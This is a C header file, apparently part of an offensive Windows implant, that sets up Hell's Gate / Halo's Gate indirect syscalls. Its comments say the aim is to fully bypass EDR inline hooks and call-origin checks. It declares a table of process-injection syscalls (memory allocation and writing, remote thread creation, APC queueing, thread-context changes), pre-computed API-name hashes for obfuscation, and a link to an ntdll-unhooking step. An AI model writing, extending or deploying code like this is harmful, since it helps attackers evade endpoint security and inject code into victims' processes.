/*
 * syscalls.h — Indirect syscall infrastructure (Hell's Gate variant).
 *
 * Resolves syscall numbers at runtime by parsing ntdll's in-memory export
 * table and extracting the SSN from each Nt* stub. Executes via a
 * hand-crafted syscall instruction so the call never passes through
 * ntdll's hooked code — EDR inline hooks are completely bypassed.
 *
 * Approach (Halo's Gate extension):
 *   1. Walk ntdll export table, find target Nt* function address.
 *   2. Check if the stub starts with the expected mov r10,rcx; mov eax,SSN
 *      pattern. If so, read the SSN directly.
 *   3. If hooked (JMP/INT3 at entry), scan neighboring syscall stubs
 *      up/down to find an unhooked neighbor, then compute our SSN by
 *      offset (syscall numbers are sequential in ntdll's export table).
 *   4. Execute via an indirect syscall: jump into the middle of a
 *      legitimate ntdll stub's `syscall` instruction so the return
 *      address on the stack points into ntdll (passes stack-based
 *      EDR call origin checks).
 */
#ifndef SYSCALLS_H
#define SYSCALLS_H

#include <windows.h>

/* ─── Error codes ─── */
#define SYSCALL_OK              0
#define SYSCALL_ERR_NO_NTDLL    1
#define SYSCALL_ERR_NO_EXPORT   2
#define SYSCALL_ERR_HOOKED      3
#define SYSCALL_ERR_RESOLVE     4

/* ─── Syscall entry: resolved at init ─── */
typedef struct _SYSCALL_ENTRY {
    DWORD   ssn;                /* Syscall service number */
    void   *pSyscallAddr;      /* Address of `syscall` instruction inside ntdll
                                  (for indirect syscall — return addr looks legit) */
    BOOL    resolved;
} SYSCALL_ENTRY;

/* ─── Table of syscalls we use ─── */
typedef struct _SYSCALL_TABLE {
    SYSCALL_ENTRY NtAllocateVirtualMemory;
    SYSCALL_ENTRY NtProtectVirtualMemory;
    SYSCALL_ENTRY NtWriteVirtualMemory;
    SYSCALL_ENTRY NtCreateThreadEx;
    SYSCALL_ENTRY NtOpenProcess;
    SYSCALL_ENTRY NtClose;
    SYSCALL_ENTRY NtQuerySystemInformation;
    SYSCALL_ENTRY NtQueryInformationProcess;
    SYSCALL_ENTRY NtCreateSection;
    SYSCALL_ENTRY NtMapViewOfSection;
    SYSCALL_ENTRY NtUnmapViewOfSection;
    SYSCALL_ENTRY NtQueueApcThread;
    SYSCALL_ENTRY NtResumeThread;
    SYSCALL_ENTRY NtSuspendThread;
    SYSCALL_ENTRY NtGetContextThread;
    SYSCALL_ENTRY NtSetContextThread;
    SYSCALL_ENTRY NtFreeVirtualMemory;
    SYSCALL_ENTRY NtReadVirtualMemory;
    SYSCALL_ENTRY NtWaitForSingleObject;
    SYSCALL_ENTRY NtDelayExecution;
    SYSCALL_ENTRY NtCreateFile;
    SYSCALL_ENTRY NtSetInformationThread;
} SYSCALL_TABLE;

/* Global syscall table — populated by syscall_init() */
extern SYSCALL_TABLE g_SyscallTable;

/*
 * Initialize the syscall table. Must be called after evasion_init()
 * (ntdll unhook happens first, but we parse the original stubs anyway).
 * Returns SYSCALL_OK on success.
 */
int syscall_init(void);

/*
 * Resolve a single syscall by function name hash (DJB2).
 * Populates entry->ssn and entry->pSyscallAddr.
 */
int syscall_resolve(DWORD nameHash, SYSCALL_ENTRY *entry);

/*
 * Execute a syscall via indirect invocation.
 * The variadic arguments are passed in RCX, RDX, R8, R9, then stack.
 *
 * Usage:
 *   NTSTATUS status = do_syscall(&g_SyscallTable.NtAllocateVirtualMemory,
 *                                 hProcess, &baseAddr, 0, &regionSize,
 *                                 MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
 */
NTSTATUS do_syscall(SYSCALL_ENTRY *entry, ...);

/* ─── DJB2 hash helper ─── */
DWORD djb2_hash(const char *str);

/* Pre-computed hashes for the Nt functions we need */
#define HASH_NtAllocateVirtualMemory    0xF783B8EC
#define HASH_NtProtectVirtualMemory     0x50E92888
#define HASH_NtWriteVirtualMemory       0xC3170192
#define HASH_NtCreateThreadEx           0x64DC7453
#define HASH_NtOpenProcess              0x4B82F718
#define HASH_NtClose                    0x40D6E69D
#define HASH_NtQuerySystemInformation   0x7BC23928
#define HASH_NtQueryInformationProcess  0x8CDEF1A0
#define HASH_NtCreateSection            0xE971E7B2
#define HASH_NtMapViewOfSection         0xFA4015C6
#define HASH_NtUnmapViewOfSection       0x6BA2B09C
#define HASH_NtQueueApcThread           0x0A6664B8
#define HASH_NtResumeThread             0x5A4BC3D0
#define HASH_NtSuspendThread            0xE43D93E1
#define HASH_NtGetContextThread         0x6B2B024E
#define HASH_NtSetContextThread         0xE2899C0F
#define HASH_NtFreeVirtualMemory        0x2802C609
#define HASH_NtReadVirtualMemory        0xA38DACF0
#define HASH_NtWaitForSingleObject      0xC6A2FA17
#define HASH_NtDelayExecution           0xF5A936AA
#define HASH_NtCreateFile               0x43FFB97E
#define HASH_NtSetInformationThread     0x0D938F78

#endif /* SYSCALLS_H */
